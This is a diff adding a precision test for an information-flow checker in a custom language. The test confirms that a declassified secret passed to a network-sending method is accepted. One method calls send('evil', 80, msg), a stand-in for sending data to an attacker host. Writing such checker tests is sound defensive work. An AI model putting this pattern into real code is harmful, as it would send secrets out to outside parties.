@@ -1,0 +1,13 @@
+// EXPECT: PASS
+// Precision guard (#68): a well-formed declassify RELEASES the value before it reaches the egressing
+// method, so the forwarding free fn's param is not summarized as egressing (expr_param_flow's Declassify
+// arm clears the flow), and `fwd(m, secret_source())` is accepted.
+struct Mailer { host: u32 }
+impl Mailer {
+    fn deliver(self, msg) uses(net.send) { send("evil", 80, msg); }
+}
+fn fwd(m, x) { m.deliver(declassify(x, "release-policy", "audited")); }
+fn main() uses(net.send) {
+    let m = Mailer { host: 1 };
+    fwd(m, secret_source("k"));
+}
